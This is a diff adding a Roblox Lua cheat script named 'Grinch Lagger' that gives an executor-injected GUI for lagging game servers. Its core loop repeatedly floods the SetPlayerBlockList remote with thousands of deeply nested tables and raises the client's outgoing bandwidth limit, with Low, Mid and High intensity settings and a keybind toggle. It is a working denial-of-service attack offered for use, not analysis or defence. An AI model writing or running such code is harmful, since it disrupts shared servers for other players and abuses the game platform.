@@ -1,0 +1,195 @@
+-- Grinch Lagger
+
+local Players         = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local TweenService    = game:GetService("TweenService")
+local LocalPlayer     = Players.LocalPlayer
+
+-- KILL HUB CORE
+local NIVELES = { Low={poder=23}, Mid={poder=32}, High={poder=70} }
+local nivelActual = "Low"
+local laggerActive = false
+local lagThread = nil
+
+local function bomb(poder)
+    local main, spam = {}, {{}}
+    local z = spam[1]
+    for i=1,25 do local t={} table.insert(z,t); z=t end
+    local max = math.min(12000, poder*50)
+    for i=1,max do table.insert(main,spam) end
+    pcall(function() game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main) end)
+end
+
+local function startLag()
+    if lagThread then task.cancel(lagThread) end
+    lagThread = task.spawn(function()
+        while laggerActive do
+            pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end)
+            bomb(NIVELES[nivelActual].poder)
+            task.wait(0.18)
+        end
+    end)
+end
+
+local function stopLag()
+    if lagThread then task.cancel(lagThread); lagThread=nil end
+end
+
+-- THEME
+local GREEN=Color3.fromRGB(80,200,50)
+local GREEN_DARK=Color3.fromRGB(30,80,15)
+local GREEN_DIM=Color3.fromRGB(20,50,10)
+local BG=Color3.fromRGB(6,6,6)
+local BG2=Color3.fromRGB(12,12,12)
+local BG3=Color3.fromRGB(18,18,18)
+local GRAY=Color3.fromRGB(80,80,80)
+
+local function getParent()
+    if typeof(gethui)=="function" then local ok,r=pcall(gethui);if ok and r then return r end end
+    local ok,cg=pcall(function() return game:GetService("CoreGui") end)
+    if ok and cg then return cg end
+    return LocalPlayer:WaitForChild("PlayerGui")
+end
+local function new(cls,props,parent)
+    local obj=Instance.new(cls)
+    for k,v in pairs(props or {}) do obj[k]=v end
+    obj.Parent=parent; return obj
+end
+local function corner(obj,r) Instance.new("UICorner",obj).CornerRadius=UDim.new(0,r) end
+local function mkStroke(obj,col,th) local s=Instance.new("UIStroke",obj);s.Color=col;s.Thickness=th;return s end
+local function tw(obj,props,t) TweenService:Create(obj,TweenInfo.new(t or 0.15,Enum.EasingStyle.Quad),props):Play() end
+
+local parent=getParent()
+local old=parent:FindFirstChild("GrinchLagger"); if old then old:Destroy() end
+
+local gui=new("ScreenGui",{Name="GrinchLagger",ResetOnSpawn=false,IgnoreGuiInset=true,ZIndexBehavior=Enum.ZIndexBehavior.Sibling},nil)
+pcall(function() gui.Parent=parent end)
+if not gui.Parent then gui.Parent=LocalPlayer:WaitForChild("PlayerGui") end
+
+-- MAIN FRAME
+local W,H=230,190
+local main=new("Frame",{Name="Main",Size=UDim2.fromOffset(W,H),Position=UDim2.new(0.5,-W/2,0.5,-H/2),BackgroundColor3=BG,BorderSizePixel=0,ClipsDescendants=true,Active=true},gui)
+corner(main,14)
+local mainStroke=mkStroke(main,GREEN_DIM,1.5)
+task.spawn(function()
+    local t=0
+    while mainStroke and mainStroke.Parent do
+        t=t+0.05; mainStroke.Transparency=0.2+math.abs(math.sin(t*2))*0.4; task.wait(0.04)
+    end
+end)
+
+-- HEADER
+local header=new("Frame",{Size=UDim2.new(1,0,0,36),BackgroundColor3=BG2,BorderSizePixel=0,ZIndex=2},main)
+corner(header,14)
+new("Frame",{Size=UDim2.new(1,0,0.5,0),Position=UDim2.new(0,0,0.5,0),BackgroundColor3=BG2,BorderSizePixel=0,ZIndex=2},header)
+new("TextLabel",{Size=UDim2.new(1,-14,1,0),Position=UDim2.fromOffset(12,0),BackgroundTransparency=1,Text="Grinch Lagger",TextColor3=GREEN,Font=Enum.Font.GothamBold,TextSize=13,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=3},header)
+new("Frame",{Size=UDim2.new(1,-24,0,1),Position=UDim2.new(0,12,0,36),BackgroundColor3=GREEN_DIM,BorderSizePixel=0},main)
+
+-- KB ROW
+local boundKey=Enum.KeyCode.V; local boundType="Keyboard"
+local waitingForKey=false; local kbConn=nil
+local GP_NAMES={[Enum.KeyCode.ButtonA]="A",[Enum.KeyCode.ButtonB]="B",[Enum.KeyCode.ButtonX]="X",[Enum.KeyCode.ButtonY]="Y",[Enum.KeyCode.ButtonR1]="RB",[Enum.KeyCode.ButtonR2]="RT",[Enum.KeyCode.ButtonL1]="LB",[Enum.KeyCode.ButtonL2]="LT",[Enum.KeyCode.DPadUp]="D↑",[Enum.KeyCode.DPadDown]="D↓",[Enum.KeyCode.DPadLeft]="D←",[Enum.KeyCode.DPadRight]="D→",[Enum.KeyCode.ButtonStart]="▶",[Enum.KeyCode.ButtonSelect]="◀",[Enum.KeyCode.ButtonR3]="R3",[Enum.KeyCode.ButtonL3]="L3"}
+local function keyName(kc) return GP_NAMES[kc] or (kc~=Enum.KeyCode.Unknown and kc.Name or "?") end
+
+local kbRow=new("Frame",{Size=UDim2.new(1,-24,0,26),Position=UDim2.fromOffset(12,44),BackgroundColor3=BG3,BorderSizePixel=0,ZIndex=3},main)
+corner(kbRow,7); mkStroke(kbRow,GREEN_DIM,1)
+new("TextLabel",{Size=UDim2.fromOffset(24,26),Position=UDim2.fromOffset(10,0),BackgroundTransparency=1,Text="KB:",TextColor3=GRAY,Font=Enum.Font.GothamBold,TextSize=9,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=4},kbRow)
+local kbBtn=new("TextButton",{Size=UDim2.fromOffset(56,18),Position=UDim2.fromOffset(36,4),BackgroundColor3=BG,BorderSizePixel=0,AutoButtonColor=false,Text=keyName(boundKey),TextColor3=GREEN,Font=Enum.Font.GothamBold,TextSize=9,ZIndex=5},kbRow)
+corner(kbBtn,5); local ks=mkStroke(kbBtn,GRAY,1)
+
+local function stopListen(kc,ktype)
+    waitingForKey=false; if kbConn then kbConn:Disconnect();kbConn=nil end
+    tw(ks,{Color=GRAY}); kbBtn.TextColor3=GREEN
+    if kc then boundKey=kc;boundType=ktype;kbBtn.Text=keyName(kc) else kbBtn.Text=keyName(boundKey) end
+end
+kbBtn.Activated:Connect(function()
+    if waitingForKey then return end
+    waitingForKey=true; kbBtn.Text="..."; kbBtn.TextColor3=Color3.fromRGB(255,255,50); tw(ks,{Color=GREEN})
+    kbConn=UserInputService.InputBegan:Connect(function(inp)
+        if not waitingForKey then return end
+        if inp.UserInputType==Enum.UserInputType.Keyboard then
+            if inp.KeyCode==Enum.KeyCode.Escape then stopListen(nil,nil);return end
+            if inp.KeyCode~=Enum.KeyCode.Unknown then stopListen(inp.KeyCode,"Keyboard") end
+        elseif inp.UserInputType==Enum.UserInputType.Gamepad1 then
+            if inp.KeyCode~=Enum.KeyCode.Unknown then stopListen(inp.KeyCode,"Gamepad") end
+        end
+    end)
+    task.delay(8,function() if waitingForKey then stopListen(nil,nil) end end)
+end)
+
+-- LEVEL BUTTONS
+local LEVELS={"Low","Mid","High"}
+local LEVEL_COLORS={Low=Color3.fromRGB(0,200,80),Mid=Color3.fromRGB(255,200,0),High=Color3.fromRGB(255,60,60)}
+local levelBtns={}
+local btnW=58; local btnGap=6
+local totalBtnW=#LEVELS*btnW+(#LEVELS-1)*btnGap
+local startX=(W-totalBtnW)/2
+
+local function refreshLevels()
+    for _,lvl in ipairs(LEVELS) do
+        local b=levelBtns[lvl]; if not b then continue end
+        local on=lvl==nivelActual
+        tw(b,{BackgroundColor3=on and LEVEL_COLORS[lvl] or BG3,TextColor3=on and Color3.fromRGB(0,0,0) or GRAY})
+    end
+end
+
+for i,lvl in ipairs(LEVELS) do
+    local x=startX+(i-1)*(btnW+btnGap)
+    local b=new("TextButton",{Size=UDim2.fromOffset(btnW,24),Position=UDim2.fromOffset(x,78),BackgroundColor3=BG3,BorderSizePixel=0,AutoButtonColor=false,Text=lvl,TextColor3=GRAY,Font=Enum.Font.GothamBold,TextSize=11,ZIndex=4},main)
+    corner(b,8); mkStroke(b,GREEN_DIM,1); levelBtns[lvl]=b
+    b.Activated:Connect(function() nivelActual=lvl; refreshLevels(); if laggerActive then startLag() end end)
+end
+refreshLevels()
+
+-- ACTIVATE
+local active=false
+local activateBtn=new("TextButton",{Size=UDim2.new(1,-24,0,52),Position=UDim2.fromOffset(12,112),BackgroundColor3=BG3,BorderSizePixel=0,AutoButtonColor=false,Text="ACTIVATE",TextColor3=GREEN,Font=Enum.Font.GothamBold,TextSize=14,ZIndex=3},main)
+corner(activateBtn,10); local activateStroke=mkStroke(activateBtn,GREEN_DIM,1)
+
+local function setActive(state)
+    active=state; laggerActive=state
+    if state then
+        tw(activateBtn,{BackgroundColor3=GREEN_DARK}); activateStroke.Color=GREEN
+        activateBtn.Text="DEACTIVATE"; activateBtn.TextColor3=Color3.fromRGB(0,0,0)
+        mainStroke.Transparency=0; startLag()
+    else
+        tw(activateBtn,{BackgroundColor3=BG3}); activateStroke.Color=GREEN_DIM
+        activateBtn.Text="ACTIVATE"; activateBtn.TextColor3=GREEN
+        stopLag()
+    end
+end
+
+activateBtn.Activated:Connect(function() setActive(not active) end)
+activateBtn.MouseEnter:Connect(function() tw(activateBtn,{BackgroundColor3=active and Color3.fromRGB(50,120,20) or Color3.fromRGB(25,25,25)}) end)
+activateBtn.MouseLeave:Connect(function() tw(activateBtn,{BackgroundColor3=active and GREEN_DARK or BG3}) end)
+
+-- KEYBIND TOGGLE
+UserInputService.InputBegan:Connect(function(inp,gpe)
+    if waitingForKey then return end
+    local isKB=inp.UserInputType==Enum.UserInputType.Keyboard
+    local isGP=inp.UserInputType==Enum.UserInputType.Gamepad1
+    if not isKB and not isGP then return end
+    if isKB and gpe then return end
+    if inp.KeyCode==Enum.KeyCode.Unknown then return end
+    if ((boundType=="Keyboard" and isKB) or (boundType=="Gamepad" and isGP)) and inp.KeyCode==boundKey then
+        setActive(not active)
+    end
+end)
+
+-- DRAG
+local dragging,dragStart,startPos=false,nil,nil
+main.InputBegan:Connect(function(i)
+    if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then
+        dragging=true;dragStart=i.Position;startPos=main.Position
+        i.Changed:Connect(function() if i.UserInputState==Enum.UserInputState.End then dragging=false end end)
+    end
+end)
+UserInputService.InputChanged:Connect(function(i)
+    if dragging and (i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch) then
+        local d=i.Position-dragStart
+        main.Position=UDim2.new(startPos.X.Scale,startPos.X.Offset+d.X,startPos.Y.Scale,startPos.Y.Offset+d.Y)
+    end
+end)
+
+setActive(false)
+print("Grinch Lagger loaded")
